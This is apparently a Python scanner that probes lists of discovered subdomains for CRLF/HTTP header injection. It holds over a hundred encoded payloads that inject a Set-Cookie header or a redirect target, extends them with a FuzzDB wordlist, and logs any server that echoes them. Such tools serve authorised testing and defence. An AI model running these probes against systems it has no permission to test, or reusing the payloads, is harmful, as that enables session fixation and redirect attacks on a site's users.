#!/usr/bin/env python
# -*- coding:utf-8 -*-

# ------------------------------------------------------------------------------
# Test HTTP server to crlf-injection
#
# 1. get subdomain by dns-discovery (https://github.com/m0nad/DNS-Discovery)
#          or      by nmap (nmap -p 80 --script dns-brute.nse example.com)
# 2. depend at FUZZDB https://github.com/fuzzdb-project/fuzzdb
# 3. modify FUZZDB path (str.25)
# 4. usage: http_header_inj.py [-h] [-f FILE] [-t {D,N}] [-l LOGFILE]
# ------------------------------------------------------------------------------

import os,sys
import logging
import json
import requests
import hashlib
import time
import argparse
import re

# format output for logging
FORMAT = '%(asctime)-15s %(message)s'
FUZZDB = '../fuzzdb'

# colors for logging
class bcolors:
   HEADER = '\033[95m'
   OKBLUE = '\033[94m'
   OKGREEN = '\033[92m'
   WARNING = '\033[93m'
   FAIL = '\033[91m'
   ENDC = '\033[0m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'

# Params from command line
class Params(object):
    pass


class CrlfInj:
    def __init__(self):
        self.tmpl_file = FUZZDB + '/attack/http-protocol/crlf-injection.fuzz.txt'
        self.tmpl = [
            '/crlf_test/../',
            '/crlf_test/%2e%2e/',
            '/%0aSet-Cookie:crlf_test_cookie=crlf_test_val',
            '/%0dSet-Cookie:crlf_test_cookie=crlf_test_val',
            '/%0aSet-Cookie:crlf_test_cookie=crlf_test_val%0aX:/%2e%2e/',
            '/%0aSet-Cookie:crlf_test_cookie=crlf_test_val%0aX:/../',
            '/%0d%0aSet-Cookie:crlf_test_cookie=crlf_test_val%0d%0aX:/%2e%2e/',
            '/%0d%0aSet-Cookie:crlf_test_cookie=crlf_test_val%0d%0aX:/../',
            '/\\r\\nSet-Cookie:crlf_test_cookie=crlf_test_val\\r\\nX:/%2e%2e/',
            '/\\r\\nSet-Cookie:crlf_test_cookie=crlf_test_val\\r\\nX:/../',
            '/\\nSet-Cookie:crlf_test_cookie=crlf_test_val\\nX:/%2e%2e/',
            '/\\nSet-Cookie:crlf_test_cookie=crlf_test_val\\nX:/../',
            '/%c4%8d%c4%8aSet-Cookie:crlf_test_cookie=crlf_test_val%c4%8d%c4%8a%c4%8d%c4%8a',
            '/%c4%8aSet-Cookie:crlf_test_cookie=crlf_test_val',
            '/%E5%98%8A%E5%98%8DSet-Cookie:%20crlf_test_cookie=crlf_test_val',
            '/%E5%98%8D%E5%98%8ASet-Cookie:%20crlf_test_cookie=crlf_test_val',
            '/%E5%98%8ASet-Cookie:%20crlf_test_cookie=crlf_test_val',
            '/?%c4%8d%c4%8aSet-Cookie:crlf_test_cookie=crlf_test_val%c4%8d%c4%8a%c4%8d%c4%8a',
            '/?%c4%8aSet-Cookie:crlf_test_cookie=crlf_test_val',
            '/?%E5%98%8A%E5%98%8DSet-Cookie:%20crlf_test_cookie=crlf_test_val',
            '/?%E5%98%8D%E5%98%8ASet-Cookie:%20crlf_test_cookie=crlf_test_val',
            '/?%E5%98%8ASet-Cookie:%20crlf_test_cookie=crlf_test_val',
            '/?crlf_test/../',
            '/?crlf_test/%2e%2e/',
            '/?%0aSet-Cookie:crlf_test_cookie=crlf_test_val',
            '/?%0dSet-Cookie:crlf_test_cookie=crlf_test_val',
            '/?%0aSet-Cookie:crlf_test_cookie=crlf_test_val%0aX:/%2e%2e/',
            '/?%0aSet-Cookie:crlf_test_cookie=crlf_test_val%0aX:/../',
            '/?%0d%0aSet-Cookie:crlf_test_cookie=crlf_test_val%0d%0aX:/%2e%2e/',
            '/?%0d%0aSet-Cookie:crlf_test_cookie=crlf_test_val%0d%0aX:/../',
            '/?\\r\\nSet-Cookie:crlf_test_cookie=crlf_test_val\\r\\nX:/%2e%2e/',
            '/?\\r\\nSet-Cookie:crlf_test_cookie=crlf_test_val\\r\\nX:/../',
            '/?\\nSet-Cookie:crlf_test_cookie=crlf_test_val\\nX:/%2e%2e/',
            '/?\\nSet-Cookie:crlf_test_cookie=crlf_test_val\\nX:/../',
            '/?lang=%c4%8d%c4%8aSet-Cookie:crlf_test_cookie=crlf_test_val%c4%8d%c4%8a%c4%8d%c4%8a',
            '/?lang=%c4%8aSet-Cookie:crlf_test_cookie=crlf_test_val',
            '/?lang=%E5%98%8A%E5%98%8DSet-Cookie:%20crlf_test_cookie=crlf_test_val',
            '/?lang=%E5%98%8D%E5%98%8ASet-Cookie:%20crlf_test_cookie=crlf_test_val',
            '/?lang=%E5%98%8ASet-Cookie:%20crlf_test_cookie=crlf_test_val',
            '/xxx?crlf_test/../',
            '/xxx?crlf_test/%2e%2e/',
            '/xxx%0aSet-Cookie:crlf_test_cookie=crlf_test_val',
            '/xxx%0dSet-Cookie:crlf_test_cookie=crlf_test_val',
            '/xxx%0aSet-Cookie:crlf_test_cookie=crlf_test_val%0aX:/%2e%2e/',
            '/xxx%0aSet-Cookie:crlf_test_cookie=crlf_test_val%0aX:/../',
            '/xxx%0d%0aSet-Cookie:crlf_test_cookie=crlf_test_val%0d%0aX:/%2e%2e/',
            '/xxx%0d%0aSet-Cookie:crlf_test_cookie=crlf_test_val%0d%0aX:/../',
            '/xxx\\r\\nSet-Cookie:crlf_test_cookie=crlf_test_val\\r\\nX:/%2e%2e/',
            '/xxx\\r\\nSet-Cookie:crlf_test_cookie=crlf_test_val\\r\\nX:/../',
            '/xxx\\nSet-Cookie:crlf_test_cookie=crlf_test_val\\nX:/%2e%2e/',
            '/xxx\\nSet-Cookie:crlf_test_cookie=crlf_test_val\\nX:/../',
            '/xxx?lang=%c4%8d%c4%8aSet-Cookie:crlf_test_cookie=crlf_test_val%c4%8d%c4%8a%c4%8d%c4%8a',
            '/xxx?lang=%c4%8aSet-Cookie:crlf_test_cookie=crlf_test_val',
            '/xxx?lang=%E5%98%8A%E5%98%8DSet-Cookie:%20crlf_test_cookie=crlf_test_val',
            '/xxx?lang=%E5%98%8D%E5%98%8ASet-Cookie:%20crlf_test_cookie=crlf_test_val',
            '/xxx?lang=%E5%98%8ASet-Cookie:%20crlf_test_cookie=crlf_test_val',


            '/%0aexample.com',
            '/%0dexample.com',
            '/%0aexample.com/%2e%2e/',
            '/%0aexample.com/../',
            '/%0d%0aexample.com%0d%0aX:/%2e%2e/',
            '/%0d%0aexample.com%0d%0aX:/../',
            '/\\r\\nexample.com\\r\\nX:/%2e%2e/',
            '/\\r\\nexample.com\\r\\nX:/../',
            '/\\nexample.com\\nX:/%2e%2e/',
            '/\\nexample.com\\nX:/../',
            '/%c4%8d%c4%8aexample.com%c4%8d%c4%8a%c4%8d%c4%8a',
            '/%c4%8aexample.com',
            '/%E5%98%8A%E5%98%8Dexample.com',
            '/%E5%98%8D%E5%98%8Aexample.com',
            '/%E5%98%8Aexample.com',
            '/?%c4%8d%c4%8aexample.com%c4%8d%c4%8a%c4%8d%c4%8a',
            '/?%c4%8aexample.com',
            '/?%E5%98%8A%E5%98%8Dexample.com',
            '/?%E5%98%8D%E5%98%8Aexample.com',
            '/?%E5%98%8A',
            '/?%0aexample.com',
            '/?%0dexample.com',
            '/?%0aexample.com/%2e%2e/',
            '/?%0aexample.com/../',
            '/?%0d%0aexample.com%0d%0aX:/%2e%2e/',
            '/?%0d%0aexample.com%0d%0aX:/../',
            '/?\\r\\nexample.com\\r\\nX:/%2e%2e/',
            '/?\\r\\nexample.com\\r\\nX:/../',
            '/?\\nexample.com\\nX:/%2e%2e/',
            '/?\\nexample.com\\nX:/../',
            '/?%c4%8d%c4%8aexample.com%c4%8d%c4%8a%c4%8d%c4%8a',
            '/?%c4%8aexample.com',
            '/?%E5%98%8A%E5%98%8Dexample.com',
            '/?%E5%98%8D%E5%98%8Aexample.com',
            '/?%E5%98%8Aexample.com',
            '/?lang=%c4%8d%c4%8aexample.com%c4%8d%c4%8a%c4%8d%c4%8a',
            '/?lang=%c4%8aexample.com',
            '/?lang=%E5%98%8A%E5%98%8Dexample.com',
            '/?lang=%E5%98%8D%E5%98%8Aexample.com',
            '/?lang=%E5%98%8Aexample.com',
            '/%0ahttp://example.com',
            '/%0dhttp://example.com',
            '/%0ahttp://example.com/%2e%2e/',
            '/%0ahttp://example.com/../',
            '/%0d%0ahttp://example.com%0d%0aX:/%2e%2e/',
            '/%0d%0ahttp://example.com%0d%0aX:/../',
            '/\\r\\nhttp://example.com\\r\\nX:/%2e%2e/',
            '/\\r\\nhttp://example.com\\r\\nX:/../',
            '/\\nhttp://example.com\\nX:/%2e%2e/',
            '/\\nhttp://example.com\\nX:/../',
            '/%c4%8d%c4%8ahttp://example.com%c4%8d%c4%8a%c4%8d%c4%8a',
            '/%c4%8ahttp://example.com',
            '/%E5%98%8A%E5%98%8Dhttp://example.com',
            '/%E5%98%8D%E5%98%8Ahttp://example.com',
            '/%E5%98%8Ahttp://example.com',
            '/?%c4%8d%c4%8ahttp://example.com%c4%8d%c4%8a%c4%8d%c4%8a',
            '/?%c4%8ahttp://example.com',
            '/?%E5%98%8A%E5%98%8Dhttp://example.com',
            '/?%E5%98%8D%E5%98%8Ahttp://example.com',
            '/?%E5%98%8A',
            '/?%0ahttp://example.com',
            '/?%0dhttp://example.com',
            '/?%0ahttp://example.com/%2e%2e/',
            '/?%0ahttp://example.com/../',
            '/?%0d%0ahttp://example.com%0d%0aX:/%2e%2e/',
            '/?%0d%0ahttp://example.com%0d%0aX:/../',
            '/?\\r\\nhttp://example.com\\r\\nX:/%2e%2e/',
            '/?\\r\\nhttp://example.com\\r\\nX:/../',
            '/?\\nhttp://example.com\\nX:/%2e%2e/',
            '/?\\nhttp://example.com\\nX:/../',
            '/?%c4%8d%c4%8ahttp://example.com%c4%8d%c4%8a%c4%8d%c4%8a',
            '/?%c4%8ahttp://example.com',
            '/?%E5%98%8A%E5%98%8Dhttp://example.com',
            '/?%E5%98%8D%E5%98%8Ahttp://example.com',
            '/?%E5%98%8Ahttp://example.com',
            '/?lang=%c4%8d%c4%8ahttp://example.com%c4%8d%c4%8a%c4%8d%c4%8a',
            '/?lang=%c4%8ahttp://example.com',
            '/?lang=%E5%98%8A%E5%98%8Dhttp://example.com',
            '/?lang=%E5%98%8D%E5%98%8Ahttp://example.com',
            '/?lang=%E5%98%8Ahttp://example.com',

        ]
        self.test_params = [
            'crlf_test',
            'Injected',
            'XSS',
            'ha.ckers.org',
            'example.com',
            'www.test.com',
        ]
        self.headers = {
            'User-Agent':'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.11.2; en-US; rv:1.9.0.5) Gecko/2008120121 Firefox/44'
        }
    def prepare(self):
        try:
            with open(self.tmpl_file,'r') as f:
                for line in f:
                    self.tmpl.append('/?' + line.strip())
                    self.tmpl.append('/xxx' + line.strip())
                    self.tmpl.append('/' + line.strip())
                    self.tmpl.append('/' + line.strip() + '/')
                    self.tmpl.append('/' + line.strip() + '/../')
                    self.tmpl.append('/' + line.strip() + '/%2e%2e/')

                    self.tmpl.append('/?' + line.strip() + 'example.com')
                    self.tmpl.append('/xxx' + line.strip() + 'example.com')
                    self.tmpl.append('/' + line.strip() + 'example.com')
                    self.tmpl.append('/?' + line.strip() + 'http://example.com')
                    self.tmpl.append('/xxx' + line.strip() + 'http://example.com')
                    self.tmpl.append('/' + line.strip() + 'http://example.com')
        except Exception as e:
            logging.error(bcolors.FAIL + 'CrlfInj:prepare (%s)' + bcolors.ENDC, e)

    def do_it(self,url):
        for template in self.tmpl:
            uri = url + template
            try:
                r = requests.get(uri, headers = self.headers, timeout = 10, allow_redirects=False)
                for test in self.test_params:
                    #if test in r.text:
                        #logging.warning(bcolors.WARNING + "uri (%s) - test (%s) - HTTP status_code (%s)" + bcolors.ENDC, uri, test, str(r.status_code))
                    for http_header in r.headers:
                        if test in http_header:
                            logging.warning(bcolors.OKBLUE + "uri (%s) - test (%s) - HTTP status_code (%s)" + bcolors.ENDC, uri, test, str(r.status_code))
                        elif test in r.headers[http_header]:
                            logging.warning(bcolors.OKGREEN + "uri (%s) - test (%s) - HTTP status_code (%s)" + bcolors.ENDC, uri, test, str(r.status_code))
            except requests.exceptions.Timeout as e:
                #logging.error(bcolors.FAIL + 'CrlfInj:do_it:uri(%s) - (%s)' + bcolors.ENDC, uri, e)
                return
            except Exception as e:
                #logging.error(bcolors.FAIL + 'CrlfInj:do_it:uri(%s) - (%s)' + bcolors.ENDC, uri, e)
                pass



def main():
    parser = argparse.ArgumentParser(description="Check domain for HTTP Injection")
    parser.add_argument('-f', dest = 'file', type = argparse.FileType('r'), help = 'file with domains list')
    parser.add_argument('-t', dest = 'type', choices = ['D','N'], type = str, help = 'D - dns-discovery, N - nmap with script dns-brute.nse')
    parser.add_argument('-l', dest = 'logfile', default='./lg.log', type = str, help = 'log file name')
    parser.parse_args(namespace=Params)

    # ----- go...

    # --- logging
    logging.basicConfig(filename = Params.logfile, format = FORMAT, level = logging.WARNING)

    # --- init tests

    # CRLF Injection
    crlf = CrlfInj()
    crlf.prepare()


    # read file with DNS answer
    for line in Params.file:
        if Params.type == 'D':
            re_tmpl = '^(https?:\/\/)?([\da-z\.-]+\.[a-z]{2,6}\.?)(\/[\w\.]*)*\/?$'
            domain = line.strip()
        elif Params.type == 'N':
            re_tmpl = '^(https?:\/\/)?([\da-z\.-]+\.[a-z]{2,6}\.?)(\/[\w\.]*)*\/?.*-.*$'
            domain = line.strip('|_').strip()

        p = re.compile(re_tmpl)
        match = re.search(p, domain)
        if match:
            domain = match.group(2)
            logging.warning(bcolors.BOLD + "domain: (%s)" + bcolors.ENDC, domain)
            url = 'http://' + domain
            #crlf.do_it(url)
            url = 'https://' + domain
            crlf.do_it(url)


if __name__ == "__main__":
    main()
